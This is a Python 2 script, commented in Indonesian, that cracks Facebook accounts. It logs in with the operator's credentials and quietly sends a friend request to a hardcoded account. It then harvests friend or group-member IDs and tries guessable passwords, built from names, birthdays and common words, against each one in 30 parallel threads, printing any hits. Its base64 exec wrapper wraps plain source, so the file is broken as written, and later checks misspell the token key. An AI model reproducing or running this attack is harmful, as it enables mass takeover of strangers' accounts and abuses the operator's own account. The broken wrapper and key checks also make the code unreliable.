# dilarang keras untuk mengedit nya dan
# siapa yang menggantikan author dia akan kami lacak
# created script by : Rizky ID feat V4N654T
import base64
exec(base64.b64decode('import os, sys, time, datetime, random, threading, json, urllib, hashlib
from multiprocessing.pool import ThreadPool
try:
    import mechanize, requests
except ImportError:
    os.system('pip2 install mechanize;pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def run(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1)


back = 0
threads = []
berhasil = []
id = []
internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Cheking Acces\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
logo = '\n\033[35;1m        ____ _  _ ___ ____ _  _ ___  ____ \n        |__| |  |  |  |  | |\/| |__] |___ \n        |  | |__|  |  |__| |  | |__] |\n\t\x1b[1;97;41m       Author : Rizky ID         \x1b[0;0m\n\t'

def login():
    os.system('reset')
    try:
        toket = open('token.txt', 'r')
        mbf()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        print '\033[37;1m[\x1b[92m=\033[37;1m] \033[37;1mLogin Facebook Dibutuhkan'
        print '\033[35;1m-------------------------------------'
        username = raw_input('\033[37;1m[\x1b[92m\xe2\x80\xa2\033[37;1m] \033[36;1mUsername \033[31;1m: \033[37;1m')
        password = raw_input('\033[37;1m[\x1b[92m\xe2\x80\xa2\033[37;1m]\033[36;1m Password \033[31;1m: \033[37;1m')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\033[37;1m[\x1b[92m\xe2\x9c\x98\033[37;1m] \033[31;1mTidak Ada koneksi internet'
            sys.exit()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = username
        br.form['pass'] = password
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + username + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + password + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': username, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': password, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                gazz = open('token.txt', 'w')
                gazz.write(z['access_token'])
                gazz.close()
                animation = ('\033[35;1m[\033[34;1m=   \033[35;1m]', '\033[35;1m[\033[34;1m =  \033[35;1m]', '\033[35;1m[\033[34;1m  = \033[35;1m]', '\033[35;1m[\033[34;1m   =\033[35;1m]')
                for i in range(100):
                    time.sleep(0.1)
                    sys.stdout.write('\r\033[37;1m[\033[32;1m\xe2\x9d\x83\033[37;1m] Sedang Login ' + animation[(i % len(animation))])
                    sys.stdout.flush()
                print '\n\x1b[37;1m[\x1b[32;1m\xe2\x9c\x93\x1b[37;1m] Login Succes'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1.5)
                mbf()
            except requests.exceptions.ConnectionError:
                print '\033[37;1m[\x1b[92m\xe2\x9c\x98\033[37;1m] \033[31;1mTidak Ada koneksi internet'
                sys.exit()

        if 'checkpoint' in url:
            print '\033[37;1m[\x1b[92m+\033[37;1m] \033[33;1mAkun Terkena Chekpoint'
            os.system('rm -rf token.txt')
            time.sleep(1)
            sys.exit()
        else:
            print '\033[37;1m[\x1b[92m\xe2\x9c\x98\033[37;1m] \033[31;1mLogin Gagal Cok'
            print '\033[37;1m[\x1b[92m-\033[37;1m] \033[37;1mKembali Login '
            os.system('rm -rf token.txt')
            time.sleep(3)
            login()


def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
        time.sleep(2)
        toolbar_width = 26
        sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
        sys.stdout.flush()
        for i in range(toolbar_width):
            sys.stdout.write('\r')
            sys.stdout.flush()
            sys.stdout.write('\033[37;1m[')
            sys.stdout.write('\033[36;1m#\033[37;1m' * (i + 1))
            sys.stdout.flush()
            time.sleep(5.0 / 100)
        try:
            rq = requests.get('http://facebook.com')
            time.sleep(1.0)
            print '\033[37;1m]\033[35;1m ~>\033[32;1m Succes'
            print '\033[37;1m[\x1b[92m+\033[37;1m] \033[32;1mKomeksi Dalam Keadaan Baik'
            time.sleep(1.0)
            login()
        except requests.exceptions.ConnectionError:
            time.sleep(1.0)
            print '\033[37;1m]\033[35;1m ~>\033[31;1m Failed'
            print '\033[37;1m[\x1b[92m\xe2\x9c\x98\033[37;1m] \033[31;1mTidak Ada Koneksi\033[37;1m'
            time.sleep(1.0)
            sys.exit()

    except KeyboardInterrupt:
    	time.sleep(3.5)
        exit('\n\033[37;1m[\x1b[92m\xe2\x9c\x98\033[37;1m] \033[31;1mProgram berhenti\n')


def mbf():
    global toket
    os.system('reset')
    try:
        toket = open('token.txt', 'r').read()
    except IOError:
        print '\x1b[32;1m{!} \x1b[31;1mToken not found'
        os.system('rm -rf token.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    os.system('date')
    print '\x1b[35;1m--------------------------------------'
    print '\033[35;1m===[\033[32;1m 1. \033[37;1mCRACK ID FRIENDS'
    print '\033[35;1m===[\033[32;1m 2. \033[37;1mCRACK ID MEMBER GROUPS'
    print '\033[35;1m===[\033[31;1m 0. \033[37;1mEXIT PROGRAM'
    print '\x1b[35;1m--------------------------------------'
    pilih_mbf()


def pilih_mbf():
    global okay
    peak = raw_input('\033[32;1m[+] \033[37;1mPilih Menu \033[36;1m:\033[37;1m ')
    if peak == '':
        print '\x1b[32;1m[!] \x1b[31;1mJangan kosong'
        pilih_mbf()
    else:
        if peak == '1' or peak == '01':
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2' or peak == '02':
                idg = raw_input('\033[37;1m[\033[32;1m?\033[37;1m] Masukan ID group \033[36;1m:\033[37;1m ')
                try:
                    os.system('reset')
                    print logo
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\033[35;1m===[\033[37;1m Name Groups\033[31;1m : \033[36;1m' + asw['name']
                except KeyError:
                    print '\x1b[32;1m[!] \x1b[37;1mGroups Not Found'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack Menu \x1b[1;91m]')
                    mbf()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0' or peak == '00':
                    os.system('rm -rf token.txt')
                    print '\x1b[32;1m{\x1b[34;1m-\x1b[32;1m}\x1b[37;1m Program\x1b[31;1m Finished'
                    sys.exit()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_mbf()
    print '\033[32;1m[+] \033[37;1mTotal ID [\033[36;1m'+str(len(id))+'\033[37;1m]\033[31;1m, \033[37;1mCracking Start' 

    print '\x1b[35;1m-------------------------------------------'

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass2
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass3
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass4
                            else:
                            	#sayang
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m sayang'
                                else:
                                	#doraemon
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=doraemon&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m doraemon'
                                    else:
                                    	#anonymous
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=anonymous&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m anonymous'
                                        else:
                                            pass8 = b['last_name'] + '12345'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass8
                                            else:
                                            	#indonesia
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=indonesia&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'acces_token' in q:
                                                    print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m indonesia'
                                                else:
                                                    #akusayangkamu
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=akusayangkamu&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'acces_token' in q:
                                                        print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m akusayangkamu'
                                                    else:
                                                        #anjing
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=anjing&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'acces_token' in q:
                                                            print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m anjing'
                                                        else:
                                                            #kontol
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=kontol123&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'acces_token' in q:
                                                                print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m kontol123'
                                                            else:
                                                                pass13 = b['first_name'] + '321'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'acces_token' in q:
                                                                    print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass13
                                                                else:
                                                                    pass14 = b['first_name'] + '54321'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'acces_token' in q:
                                                                        print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass14
                                                                    else:
                                                                        pass15 = b['last_name'] + '321'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'acces_token' in q:
                                                                            print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass15
                                                                        else:
                                                                            pass16 = b['last_name'] + '54321'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'acces_token' in q:
                                                                                print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m ' + pass16
                                                                            else:
                                                                                #bangsat
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=bangsat&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'acces_token' in q:
                                                                                    print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m bangsat'
                                                                                else:
                                                                                    #jancok123
                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=jancok123&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'acces_token' in q:
                                                                                    	print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m jancok123'
                                                                                    else:
                                                                                    	data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=anakcantik123&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'acces_token' in q:
                                                                                            print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m anakcantik123'
                                                                                        else:
                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=anakganteng123&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                            q = json.load(data)
                                                                                            if 'acces_token' in q:
                                                                                            	print '\x1b[37;1m[\x1b[32;1mOK\xe2\x9c\x93\x1b[37;1m] \x1b[36;1m=>\x1b[37;1m ' + user + '\x1b[36;1m =>\x1b[37;1m anakganteng123'
        except:
            pass

    meq = ThreadPool(30)
    meq.map(main, id)
    print '\x1b[35;1m-------------------------------------------'
    run('\x1b[32;1m{\x1b[34;1m-\x1b[32;1m}\x1b[37;1m Program\x1b[31;1m Finished')
    os.system('rm -rf token.txt')
    sys.exit()


if __name__ == '__main__':
    ceknet()
'))
